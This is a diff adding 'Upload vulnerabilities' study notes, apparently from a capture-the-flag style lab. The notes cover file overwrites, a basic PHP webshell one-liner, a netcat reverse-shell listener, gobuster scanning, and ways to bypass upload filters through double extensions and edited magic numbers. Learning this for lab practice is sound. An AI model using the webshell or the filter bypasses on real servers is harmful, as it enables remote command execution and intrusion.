@@ -143,6 +143,50 @@
 
       * Logs can store info such as HTTP status codes, timestamps, usernames, page locations and IP addresses.
 
+* Upload vulnerabilities:
+
+  * Overwriting existing files - if files are uploaded with the same name as files on the website, and there are no checks being conducted, there is a chance that we can overwrite the existing files.
+
+  * Remote code execution -
+
+    * Webshells -
+
+      ```shell
+      gobuster dir -u http://demo.uploadvulns.thm -w /usr/share/wordlists/directory-list.txt
+      #scan website directories using gobuster
+      #check for directories where files can be uploaded
+      #if found, try to upload files like images
+
+      #if the upload works, we can attempt to upload webshells
+      #the webshell should be in the same language as the backend of the website
+      #an example of a basic PHP webshell if <?php echo system($_GET["cmd"]);?>
+      #this can let us execute commands
+      ```
+
+    * Reverse shells -
+
+      ```shell
+      #similar process to uploading a webshell
+      #we can use any reverse shell, and change the IP address and port
+
+      nc -nvlp 1234
+      #attacker machine listening on port 1234
+      #once shell has been uploaded, navigate to that directory
+      #this will give us RCE from our shell
+      ```
+
+  * Bypassing client-side filtering - this would require intercepting using Burp Suite and modifying the incoming page to remove the functions that filter the files using MIME types (or other filters), and then upload the reverse shell.
+
+  * Bypassing server-side filtering - if the server-side code checks for file extensions and blacklists ```.php``` extensions, we can try alternatives such as naming the file with the extension ```.png.php``` so as to attempt to bypass the filter. If this does not work, we can also tweak the magic numbers (file signatures) of the file being uploaded; ```hexeditor``` can be used to edit in this way.
+
+  * Methodology:
+
+    1. Go through website, look at headers
+    2. Inspect website through source-code for client-side filters
+    3. Use ```gobuster``` with ```-x``` switch to find directories with particular extensions
+    4. Upload any file and check if it gets uploaded
+    5. Attempt malicious file upload
+
 ## Cryptography
 
 ---
